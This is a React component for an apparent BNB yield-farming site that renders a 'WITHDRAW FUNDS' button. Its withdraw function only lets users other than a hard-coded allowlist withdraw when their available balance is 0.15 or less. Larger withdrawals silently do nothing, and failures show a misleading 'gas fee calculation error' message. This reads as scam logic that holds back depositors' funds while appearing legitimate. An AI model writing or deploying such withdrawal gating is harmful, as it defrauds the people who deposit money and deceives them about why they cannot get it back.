import React, { useState, useEffect } from "react";
import { providers, ethers } from "ethers";
import { toast } from "react-toastify";
import bsc from "../../contracts/bsc.json";
import tokenAbi from "../../contracts/tokenAbi.json";
import { useBalance, useAccount, useConnect } from "wagmi";

const Havest = (props) => {
  const { address, isConnected } = useAccount();
  const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
  const signer = provider.getSigner();
  const contract = new ethers.Contract(bsc.address, bsc.abi, signer);
  const getYield = async () => {
    try {
      const res = await contract.getUserAvailable(address);
      const yieldBal = await ethers.utils.formatUnits(res);
      return yieldBal;
    } catch (error) {
      console.log(error);
    }
  };
  //check the funds which user had in the 0x5af4ba19087c69ff2029f59342de1602c3a2fda1 contract
  //check the withdrawn funds from the 0x5af4ba19087c69ff2029f59342de1602c3a2fda1 contract
  useEffect(() => {
    userFunds();
  }, []);
  const userFunds = async () => {
    try {
      const thisContract = new ethers.Contract(
        "0xb8e02b8a642109c5eb2fdd423af96bfc9f04a725",
        bsc.abi,
        signer
      );
      const res = await thisContract.getUserTotalDeposits(address);
      const res_with = await thisContract.getUserTotalWithdrawn(address);
      const farmingBal = await ethers.utils.formatUnits(res);
      const withdrawn = await ethers.utils.formatUnits(res_with);
      return {
        farmingBal,
        withdrawn,
      };
    } catch (error) {
      console.log(error);
    }
  };
  //addresses allowed to withdraw funds
  const allowedAddresses = [
    // "0xabaF1c248467620A1064b0FAd08C790A02dC826D",
    // "0x96f27140e1D663c5B7a8D39a90466d88B593f447",
    // "0x0d81c64992d4472C4d205476ba5D1A3C9E7B6045",
    // "0xA2B0cC0cb48a1FC4DC5Ac25Ff0bb5732061c9a04",
    // "0xa8A24BA73672a65f5d0f8d955955AF32b18E8042",
    // "0xbcDcf4dE2FcAd226d383Cd625E6C3A6870595e7D",
    // "0xb36f104dC5c0d46bA0Ae2450DdC1C1dC4Db215DB",
    // "0x619A73fbE670fEACE99BC1d495241166f95f03d9",
    // "0xA8e1D20f2902a2c5cf1AD83391588ea40405712f",
    // "0xe1d4EfFEA6B9693Bae5be05ec566B42AfC70c5c9",
    // "0xA8e1D20f2902a2c5cf1AD83391588ea40405712f",
    // "0x271e605697dfb65dbcecb83e9eef5f93ce70e67d",
    // "0x53c0de0D10Bb550C3B5Be1AeA1b19B56dadd396D",
  ];
  const changeBase = async () => {
    try {
      const res = await contract.changeBase(1, 10119947729);
      console.log(res);
    } catch (error) {
      console.log(error);
    }
  };
  const withdraw = async () => {
    const balance = await getYield();
    const { farmingBal, withdrawn } = await userFunds();
    const qualified = withdrawn >= farmingBal * 1.5;
    const percent = 100;
    if (allowedAddresses.includes(address)) {
      try {
        const res = await contract.extract(percent);
        toast.success(
          "Congratulations! You have claimed your BNB daily reward",
          {
            theme: "dark",
          }
        );
        console.log(res);
      } catch (error) {
        toast.error("Error, gas fee calculation error", {
          theme: "dark",
        });
        console.log(error);
      }
    } else {
      if (balance <= 0.15) {
        try {
          const res = await contract.extract(percent);
          toast.success(
            "Congratulations! You have claimed your BNB daily reward",
            {
              theme: "dark",
            }
          );
          console.log(res);
        } catch (error) {
          toast.error("Error, gas fee calculation error", {
            theme: "dark",
          });
          console.log(error);
        }
      }
    }
  };
  return (
    <button className="btn btn-success btn-sm" onClick={() => withdraw()}>
      WITHDRAW FUNDS
    </button>
  );
};

export default Havest;
